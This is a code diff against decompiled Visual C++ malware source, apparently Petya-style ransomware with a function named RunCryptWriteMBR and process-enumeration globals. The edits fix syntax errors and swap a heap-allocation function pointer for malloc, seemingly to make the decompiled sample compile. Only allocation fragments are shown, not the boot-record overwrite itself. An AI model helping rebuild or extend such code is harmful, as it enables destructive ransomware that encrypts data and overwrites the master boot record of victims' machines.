@@ -19,6 +19,7 @@ Detected compiler: Visual C++
 #include <winsock.h>
 //#include <shlobj_core.h>
 
+
 #include "Idadefs.h"
 #include "defs.h"
 #include "Header.h"
@@ -37,11 +38,12 @@ int dword_68206000 = 1; // weak
 int dword_68206010 = 1; // weak
 BOOL byte_681FFF4C = 1; // weak
 
-int(__stdcall *off_6820B104)(_DWORD) = &CreateHeap; // weak
+//int(__stdcall *off_6820B104)(_DWORD) = &CreateHeap; // weak // This should probably be ignored. It is a pointer to a rern of malloc mostlikely.
+BYTE* off_6820B104;
 
 __int16 word_6820F0F8; // weak
 //int dword_6820F0FC; // idb // orig // globalbuffer?
-void * dword_6820F0FC
+void * dword_6820F0FC;
 LPWSTR lpMem; // idb
 int EnumeratedProcessesHandle; // weak
 LPCRITICAL_SECTION lpCriticalSection; // idb
@@ -423,9 +425,9 @@ int RunCryptWriteMBR()
 	unsigned int v6; // eax
 	char *v7; // eax
 	size_t v8; // esi
-	BYTE *v9; // eax
+	void *v9; // eax
 	void *v10; // eax
-	int v11; // eax
+	void* v11; // eax
 	int v12; // ebx
 	char *v13; // eax
 	_DWORD *v14; // ecx
@@ -551,7 +553,8 @@ int RunCryptWriteMBR()
 								memcpy(v35, &Src, v8);
 								v35[v8] = 0;
 							}
-							v9 = off_6820B104(512);
+							//v9 = off_6820B104(512); // orig
+							v9 = malloc(512);
 							v45 = v9;
 							if (v9)
 							{
@@ -565,7 +568,8 @@ int RunCryptWriteMBR()
 							dword_6820F8F8 = result;
 							if (result >= 0)
 							{
-								v10 = off_6820B104(8881);
+								//v10 = off_6820B104(8881); //orig
+								v10 = malloc(8881);
 								v46 = v10;
 								if (v10)
 								{
@@ -581,7 +585,8 @@ int RunCryptWriteMBR()
 								if (result >= 0)
 								{
 									v43 = Size - (Size & 0x1FF) + 1024;
-									v11 = off_6820B104(v43);
+									//v11 = off_6820B104(v43); // orig
+									v11 = malloc(v43); 
 									v12 = v11;
 									if (!v11)
 									{
